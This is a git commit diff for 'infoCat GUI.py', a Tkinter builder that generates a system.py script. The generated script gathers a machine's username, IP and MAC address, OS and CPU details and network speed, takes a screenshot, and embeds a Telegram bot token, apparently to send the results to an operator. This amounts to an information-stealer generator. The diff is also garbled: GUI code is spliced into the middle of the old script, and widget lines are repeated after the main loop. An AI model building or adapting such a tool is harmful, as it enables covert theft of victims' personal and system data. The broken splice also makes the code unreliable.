63d0ee9f915eb2fb5fe1ce7ef2d5c1f3c3997237
NeoCreat0r <74102091+NeoCreat0r@users.noreply.github.com>
2020-12-27 10:22:38 +0000

    Новый исходный код
    Редакция исходного кода

--- Source/infoCat GUI.py
+++ Source/infoCat GUI.py
@@ -25,15 +25,45 @@ start = datetime.now()
 
 name = getpass.getuser()
 ip = socket.gethostbyname(socket.getfqdn())
+# -*- coding: utf-8 -*-
+from tkinter import *
+from tkinter import messagebox as mb
+from PIL import ImageTk, Image
+import webbrowser
+
+
+def clicked():
+    system = open("system.py", "w")
+    system.write('''# -*- coding: utf-8 -*-
+import getpass
+import os
+import socket
+from datetime import datetime
+from uuid import getnode as get_mac
+import pyautogui
+from speedtest import Speedtest
+import telebot
+import psutil
+import platform
+from PIL import Image
+
+bot = telebot.TeleBot("''' + API.get() + '''")
+
+start = datetime.now()
+
+name = getpass.getuser()
+ip = socket.gethostbyname(socket.getfqdn())
 mac = get_mac()
-ost = sys.platform
+ost = platform.uname()
 inet = Speedtest()
 download = float(str(inet.download())[0:2] + "."
                  + str(round(inet.download(), 2))[1]) * 0.125
 uploads = float(str(inet.upload())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
 
-time = datetime.now(timezone.utc).astimezone()
+zone = psutil.boot_time()
+time = datetime.fromtimestamp(zone)
+cpu = psutil.cpu_freq()
 os.getcwd()
 os.chdir(r"''' + direct.get() + ''' ")
 screen = pyautogui.screenshot("screenshot.jpg")
@@ -42,16 +72,8 @@ ends = datetime.now()
 workspeed = format(ends - start)
 os.getcwd()
 os.chdir(r"''' + direct.get() + ''' ")
-if ost == "win32":
-    ost = str("Windows")
-elif ost == "linux":
-    ost = str("Linux")
-elif ost == "darwin":
-    ost = str("Mac OS")
-else:
-    pass
 file = open("info.txt", "w")
-file.write(f'[================================================]\\n  Operating System: {ost}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n [================================================]')
+file.write(f"[================================================]\\n  Operating System: {ost.system}\\n  Processor: {ost.processor}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n  Max Frequency: {cpu.max:.2f} Mhz\\n  Min Frequency: {cpu.min:.2f} Mhz\\n  Current Frequency: {cpu.current:.2f} Mhz\\n[================================================]\\n")
 file.close()
 
 text = "Screenshot"
@@ -82,7 +104,7 @@ bot.polling()
 def clicked2():
     answer = mb.askyesno(title="Redirecting", message="Open author feedback?")
     if answer:
-        webbrowser.open("https://t.me/infocat_bot", new=2)
+        webbrowser.open("https://t.me/rickevil", new=2)
     else:
         pass
 
@@ -106,6 +128,19 @@ API = Entry(root, width=20, bg="#8c8c8c")
 API.grid(padx=0, pady=0)
 
 text2 = Label(root, text="Path to save the files", bg="#000000", fg="#ffffff")
+text2.grid(padx=0, pady=0)
+
+direct = Entry(root, width=20, bg="#8c8c8c")
+direct.grid(padx=0, pady=0)
+
+button = Button(root, text="     Build     ", command=clicked, background="#ffea00", height=2)
+button.grid(padx=6, pady=6)
+
+help = Button(root, text="     Help     ", command=clicked2, background="#ffea00", height=1)
+help.grid(padx=6, pady=8)
+
+root.mainloop()
+
 text2.grid(padx=0, pady=0)
 
 direct = Entry(root, width=20, bg="#8c8c8c")
